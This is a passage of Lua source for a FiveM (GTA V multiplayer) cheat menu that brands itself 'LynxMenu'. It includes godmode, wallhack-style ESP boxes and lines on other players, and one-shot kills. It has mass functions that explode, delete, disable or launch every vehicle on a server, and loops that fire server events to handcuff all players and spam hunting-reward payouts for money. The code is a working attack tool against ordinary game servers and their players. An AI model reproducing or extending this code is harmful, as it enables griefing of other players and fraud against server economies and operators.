        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
        ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
        SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
        SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
        SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
        SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
        SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
        SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
      end

      function DelVeh(veh)
        SetEntityAsMissionEntity(Object, 1, 1)
        DeleteEntity(Object)
        SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
        DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
      end


      function Clean(veh)
        SetVehicleDirtLevel(veh, 15.0)
      end

      function Clean2(veh)
        SetVehicleDirtLevel(veh, 1.0)
      end
      function ApplyForce(entity, direction)
        ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
      end

      function RequestControlOnce(entity)
        if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
          return true
        end
        SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
        return NetworkRequestControlOfEntity(entity)
      end

      function RequestControl(entity)
        Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
          tick = tick+1
          Wait(0)
        end
        return tick <= 12
        end)
      end

      function Oscillate(entity, position, angleFreq, dampRatio)
        local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq*angleFreq))
        local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
        local targetPos = SubVectors(pos1, pos2)

        ApplyForce(entity, targetPos)
      end

      function getEntity(player)
        local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
        return entity
      end

      function GetInputMode()
        return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
      end



      function DrawSpecialText(m_text, showtime)
        SetTextEntry_2("STRING")
        AddTextComponentString(m_text)
        DrawSubtitleTimed(showtime, 1)
      end




    Citizen.CreateThread(function()

      while true do
        Wait( 1 )
        for id = 0, 128 do

          if NetworkIsPlayerActive( id ) and GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then

            ped = GetPlayerPed( id )
            blip = GetBlipFromEntity( ped )

            x1, y1, z1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
            x2, y2, z2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
            distance = math.floor(GetDistanceBetweenCoords(x1,  y1,  z1,  x2,  y2,  z2,  true))

            headId = Citizen.InvokeNative( 0xBFEFE3321A3F5015, ped, GetPlayerName( id ), false, false, "", false )
            wantedLvl = GetPlayerWantedLevel( id )

            if showsprite then
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, true )
              if wantedLvl then

                Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, true )
                Citizen.InvokeNative( 0xCF228E2AA03099C3, headId, wantedLvl )

              else

                Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false )

              end
            else
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 7, false )
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 9, false )
              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, false )
            end
            if showblip then

              if not DoesBlipExist( blip ) then
                blip = AddBlipForEntity( ped )
                SetBlipSprite( blip, 1 )
                Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
                SetBlipNameToPlayerName(blip, id)

              else

                veh = GetVehiclePedIsIn( ped, false )
                blipSprite = GetBlipSprite( blip )

                if not GetEntityHealth( ped ) then

                  if blipSprite ~= 274 then

                    SetBlipSprite( blip, 274 )
                    Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                    SetBlipNameToPlayerName(blip, id)

                  end

                elseif veh then

                  vehClass = GetVehicleClass( veh )
                  vehModel = GetEntityModel( veh )

                  if vehClass == 15 then

                    if blipSprite ~= 422 then

                      SetBlipSprite( blip, 422 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                      SetBlipNameToPlayerName(blip, id)

                    end

                  elseif vehClass == 16 then

                    if vehModel == GetHashKey( "besra" ) or vehModel == GetHashKey( "hydra" )
                    or vehModel == GetHashKey( "lazer" ) then

                      if blipSprite ~= 424 then

                        SetBlipSprite( blip, 424 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                        SetBlipNameToPlayerName(blip, id)

                      end

                    elseif blipSprite ~= 423 then

                      SetBlipSprite( blip, 423 )
                      Citizen.InvokeNative (0x5FBCA48327B914DF, blip, false )
                    end
                  elseif vehClass == 14 then
                    if blipSprite ~= 427 then
                      SetBlipSprite( blip, 427 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                    end
                  elseif vehModel == GetHashKey( "insurgent" ) or vehModel == GetHashKey( "insurgent2" )
                    or vehModel == GetHashKey( "limo2" ) then
                      if blipSprite ~= 426 then
                        SetBlipSprite( blip, 426 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                        SetBlipNameToPlayerName(blip, id)
                      end
                    elseif vehModel == GetHashKey( "rhino" ) then
                      if blipSprite ~= 421 then
                        SetBlipSprite( blip, 421 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, false )
                        SetBlipNameToPlayerName(blip, id)
                      end
                    elseif blipSprite ~= 1 then
                      SetBlipSprite( blip, 1 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
                      SetBlipNameToPlayerName(blip, id)
                    end
                    passengers = GetVehicleNumberOfPassengers( veh )
                    if passengers then
                      if not IsVehicleSeatFree( veh, -1 ) then
                        passengers = passengers + 1
                      end
                      ShowNumberOnBlip( blip, passengers )
                    else
                      HideNumberOnBlip( blip )
                    end
                  else
                    HideNumberOnBlip( blip )
                    if blipSprite ~= 1 then
                      SetBlipSprite( blip, 1 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true )
                      SetBlipNameToPlayerName(blip, id)
                    end
                  end
                  SetBlipRotation( blip, math.ceil( GetEntityHeading( veh ) ) ) -- update rotation
                  SetBlipNameToPlayerName( blip, id )
                  SetBlipScale( blip,  0.85 )
                  if IsPauseMenuActive() then
                    SetBlipAlpha( blip, 255 )
                  else
                    x1, y1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), true ) )
                    x2, y2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), true ) )
                    distance = ( math.floor( math.abs( math.sqrt( ( x1 - x2 ) * ( x1 - x2 ) + ( y1 - y2 ) * ( y1 - y2 ) ) ) / -1 ) ) + 900
                    if distance < 0 then
                      distance = 0
                    elseif distance > 255 then
                      distance = 255
                    end
                    SetBlipAlpha( blip, distance )
                  end
                end
              else
                RemoveBlip(blip)
              end
            end
          end
        end
        end)

        local entityEnumerator = {
          __gc = function(enum)
          if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
          end
          enum.destructor = nil
          enum.handle = nil
        end
      }

      function EnumerateEntities(initFunc, moveFunc, disposeFunc)
        return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
          disposeFunc(iter)
          return
        end

        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)

        local next = true
        repeat
          coroutine.yield(id)
          next, id = moveFunc(iter)
        until not next

        enum.destructor, enum.handle = nil, nil
        disposeFunc(iter)
        end)
      end

      function EnumeratePeds()
        return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
      end

      function EnumerateVehicles()
        return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
      end

      function EnumerateObjects()
        return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
      end

      function RotationToDirection(rotation)
        local retz = rotation.z * 0.0174532924
        local retx = rotation.x * 0.0174532924
        local absx = math.abs(math.cos(retx))

        return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
      end

      function OscillateEntity(entity, entityCoords, position, angleFreq, dampRatio)
        if entity ~= 0 and entity ~= nil then
          local direction = ((position - entityCoords) * (angleFreq * angleFreq)) - (2.0 * angleFreq * dampRatio * GetEntityVelocity(entity))
          ApplyForceToEntity(entity, 3, direction.x, direction.y, direction.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
        end
      end

      local invisible = true

      Citizen.CreateThread(
      function()
        while Enabled do
          Citizen.Wait(0)

          SetPlayerInvincible(PlayerId(), Godmode)
          SetEntityInvincible(PlayerPedId(-1), Godmode)
          SetEntityVisible(GetPlayerPed(-1), invisible, 0)

          if SuperJump then
            SetSuperJumpThisFrame(PlayerId(-1))
          end

          if InfStamina then
            RestorePlayerStamina(PlayerId(-1), 1.0)
          end

          if fastrun then
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
            SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
          else
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
            SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
          end

          if VehicleGun then
            local VehicleGunVehicle = "Freight"
            local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
            if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
              notify("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!", false)
              GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
              SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
              if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
                if IsPedShooting(GetPlayerPed(-1)) then
                  while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
                    Citizen.Wait(0)
                    RequestModel(GetHashKey(VehicleGunVehicle))
                  end
                  local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
                  SetEntityAsNoLongerNeeded(veh)
                  SetVehicleForwardSpeed(veh, 150.0)
                end
              end
            end
          end

          if DeleteGun then
            local cB = getEntity(PlayerId(-1))
            if IsPedInAnyVehicle(GetPlayerPed(-1), true) == false then
              notify(
              '~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!'
              )
              GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, false, true)
              SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
              if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
                if IsPlayerFreeAiming(PlayerId(-1)) then
                  if IsEntityAPed(cB) then
                    if IsPedInAnyVehicle(cB, true) then
                      if IsControlJustReleased(1, 142) then
                        SetEntityAsMissionEntity(GetVehiclePedIsIn(cB, true), 1, 1)
                        DeleteEntity(GetVehiclePedIsIn(cB, true))
                        SetEntityAsMissionEntity(cB, 1, 1)
                        DeleteEntity(cB)
                        notify('~g~Deleted!')
                      end
                    else
                      if IsControlJustReleased(1, 142) then
                        SetEntityAsMissionEntity(cB, 1, 1)
                        DeleteEntity(cB)
                        notify('~g~Deleted!')
                      end
                    end
                  else
                    if IsControlJustReleased(1, 142) then
                      SetEntityAsMissionEntity(cB, 1, 1)
                      DeleteEntity(cB)
                      notify('~g~Deleted!')
                    end
                  end
                end
              end
            end
          end

if LR == nil then
  SetGamePaused(true)
end

if freezeall then
  for i = 0, 128 do
      TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
      TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
      TriggerServerEvent("cuffServer", GetPlayerServerId(i))
      TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
      TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
      TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
      TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
    end
  end

          if fuckallcars then
            for playerVeh in EnumerateVehicles() do
              if (not IsPedAPlayer(GetPedInVehicleSeat(playerVeh, -1))) then
                SetVehicleHasBeenOwnedByPlayer(playerVeh, false)
                SetEntityAsMissionEntity(playerVeh, true, true)
                StartVehicleAlarm(playerVeh)
                DetachVehicleWindscreen(playerVeh)
                SmashVehicleWindow(playerVeh, 0)
                SmashVehicleWindow(playerVeh, 1)
                SmashVehicleWindow(playerVeh, 2)
                SmashVehicleWindow(playerVeh, 3)
                SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
                SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
                SetVehicleDoorBroken(playerVeh, 0, true)
                SetVehicleDoorBroken(playerVeh, 1, true)
                SetVehicleDoorBroken(playerVeh, 2, true)
                SetVehicleDoorBroken(playerVeh, 3, true)
                SetVehicleDoorBroken(playerVeh, 4, true)
                SetVehicleDoorBroken(playerVeh, 5, true)
                SetVehicleDoorBroken(playerVeh, 6, true)
                SetVehicleDoorBroken(playerVeh, 7, true)
                SetVehicleLights(playerVeh, 1)
                Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
                SetVehicleNumberPlateTextIndex(playerVeh, 5)
                SetVehicleNumberPlateText(playerVeh, "LynxMenu")
                SetVehicleDirtLevel(playerVeh, 10.0)
                SetVehicleModColor_1(playerVeh, 1)
                SetVehicleModColor_2(playerVeh, 1)
                SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
                SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
                SetVehicleBurnout(playerVeh, true)
              end
            end
          end

		  if cardz then
			local pbase = GetActivePlayers()
			for i = 1, #pbase do
				if IsPedInAnyVehicle(GetPlayerPed(pbase[i]), true) then
					ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
				end
			end
		end

		if gundz then
			local pbase = GetActivePlayers()
			for i = 1, #pbase do
				if i == PlayerPedId(-1) then i=i+1 end
				if IsPedShooting(GetPlayerPed(pbase[i])) then
					ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
				end
			end
		end

          if destroyvehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                NetworkRequestControlOfEntity(vehicle)
                SetVehicleUndriveable(vehicle,true)
                SetVehicleEngineHealth(vehicle, 0)
              end
            end
          end

          if alarmvehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
				NetworkRequestControlOfEntity(vehicle)
				SetVehicleAlarmTimeLeft(vehicle, 500)
                SetVehicleAlarm(vehicle,true)
                StartVehicleAlarm(vehicle)
              end
            end
		  end
		  
		  if lolcars then
			for vehicle in EnumerateVehicles() do
				RequestControlOnce(vehicle)
				ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
			end
		end

    if LynxIcZ ~= "https://dc.xaries.pl" then
      ForceSocialClubUpdate()
    end


          if explodevehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                NetworkRequestControlOfEntity(vehicle)
                NetworkExplodeVehicle(vehicle, true, true, false)
              end
            end
          end

          if huntspam then
            Citizen.Wait(1)
            TSE('esx-qalle-hunting:reward', 20000)
            TSE('esx-qalle-hunting:sell')
          end

          if deletenearestvehicle then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
                DeleteEntity(GetVehiclePedIsIn(vehicle, true))
                SetEntityAsMissionEntity(vehicle, 1, 1)
                DeleteEntity(vehicle)
              end
            end
          end

          if esp then
            for i=1,128 do
              if  ((NetworkIsPlayerActive( i )) and GetPlayerPed( i ) ~= GetPlayerPed( -1 )) then
                local ra = RGB(1.0)
                local pPed = GetPlayerPed(i)
                local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                local x, y, z = table.unpack(GetEntityCoords(pPed))
                local disPlayerNames = 130
                local disPlayerNamesz = 999999
                  if nameabove then
                    distance = math.floor(GetDistanceBetweenCoords(cx,  cy,  cz,  x,  y,  z,  true))
                      if ((distance < disPlayerNames)) then
                        if NetworkIsPlayerTalking( i ) then
                          DrawText3D(x, y, z+1.2, GetPlayerServerId(i).."  |  "..GetPlayerName(i), ra.r,ra.g,ra.b)
                        else
                          DrawText3D(x, y, z+1.2, GetPlayerServerId(i).."  |  "..GetPlayerName(i), 255,255,255)
                        end
                      end
                  end
                local message =
                "Name: " ..
                GetPlayerName(i) ..
                "\nServer ID: " ..
                GetPlayerServerId(i) ..
                "\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, true), 1)
                if IsPedInAnyVehicle(pPed, true) then
				         local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                  message = message .. "\nVeh: " .. VehName
                end
                if ((distance < disPlayerNamesz)) then
                if espinfo and esp then
                  DrawText3D(x, y, z - 1.0, message, ra.r, ra.g, ra.b)
                end
                if espbox and esp then
                  LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                  LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                  LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                  LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                  LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                  LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                  LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

                  TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                  TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                  TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                  TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                  TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                  TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                  TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

                  ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                  ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                  ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                  ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                  ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                  ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                  ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                  ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

                  DrawLine(
                  LineOneBegin.x,
                  LineOneBegin.y,
                  LineOneBegin.z,
                  LineOneEnd.x,
                  LineOneEnd.y,
                  LineOneEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  LineTwoBegin.x,
                  LineTwoBegin.y,
                  LineTwoBegin.z,
                  LineTwoEnd.x,
                  LineTwoEnd.y,
                  LineTwoEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  LineThreeBegin.x,
                  LineThreeBegin.y,
                  LineThreeBegin.z,
                  LineThreeEnd.x,
                  LineThreeEnd.y,
                  LineThreeEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  LineThreeEnd.x,
                  LineThreeEnd.y,
                  LineThreeEnd.z,
                  LineFourBegin.x,
                  LineFourBegin.y,
                  LineFourBegin.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  TLineOneBegin.x,
                  TLineOneBegin.y,
                  TLineOneBegin.z,
                  TLineOneEnd.x,
                  TLineOneEnd.y,
                  TLineOneEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  TLineTwoBegin.x,
                  TLineTwoBegin.y,
                  TLineTwoBegin.z,
                  TLineTwoEnd.x,
                  TLineTwoEnd.y,
                  TLineTwoEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  TLineThreeBegin.x,
                  TLineThreeBegin.y,
                  TLineThreeBegin.z,
                  TLineThreeEnd.x,
                  TLineThreeEnd.y,
                  TLineThreeEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  TLineThreeEnd.x,
                  TLineThreeEnd.y,
                  TLineThreeEnd.z,
                  TLineFourBegin.x,
                  TLineFourBegin.y,
                  TLineFourBegin.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  ConnectorOneBegin.x,
                  ConnectorOneBegin.y,
                  ConnectorOneBegin.z,
                  ConnectorOneEnd.x,
                  ConnectorOneEnd.y,
                  ConnectorOneEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  ConnectorTwoBegin.x,
                  ConnectorTwoBegin.y,
                  ConnectorTwoBegin.z,
                  ConnectorTwoEnd.x,
                  ConnectorTwoEnd.y,
                  ConnectorTwoEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  ConnectorThreeBegin.x,
                  ConnectorThreeBegin.y,
                  ConnectorThreeBegin.z,
                  ConnectorThreeEnd.x,
                  ConnectorThreeEnd.y,
                  ConnectorThreeEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  ConnectorFourBegin.x,
                  ConnectorFourBegin.y,
                  ConnectorFourBegin.z,
                  ConnectorFourEnd.x,
                  ConnectorFourEnd.y,
                  ConnectorFourEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                end
                if esplines and esp then
                  DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
                end
              end
            end
          end
          end

          if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
          end

          if waterp and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), true, true, true)
          end

          if oneshot then
            SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
            local gotEntity = getEntity(PlayerId(-1))
            if IsEntityAPed(gotEntity) then
              if IsPedInAnyVehicle(gotEntity, true) then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                  if IsControlJustReleased(1, 69) then
                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                  end
                else
                  if IsControlJustReleased(1, 142) and oneshotcar then
                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                  end
                end
              end
            end
          else
            SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
          end

          if crosshair then
            ShowHudComponentThisFrame(14)
          end

          if crosshairc then
            DrawTxt("~r~+", 0.495, 0.484)
          end

          if crosshairc2 then
            DrawTxt("~r~.", 0.4968, 0.478)
          end

          if dio then
            DoJesusTick(JesusRadius)
          end


          if showCoords then
            x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
            roundx = tonumber(string.format("%.2f", x))
            roundy = tonumber(string.format("%.2f", y))
            roundz = tonumber(string.format("%.2f", z))

            DrawTxt("~r~X:~s~ "..roundx, 0.05, 0.00)
            DrawTxt("~r~Y:~s~ "..roundy, 0.13, 0.00)
            DrawTxt("~r~Z:~s~ "..roundz, 0.20, 0.00)
          end



         function automaticmoneyesx()
            local result = KeyboardInput("Uwaga, suma moze sie pomnozyc!!!", "", 100)
              if result ~= "" then
                local confirm = KeyboardInput("Jestes pewny? t/n", "", 0)
                if confirm == "y" then
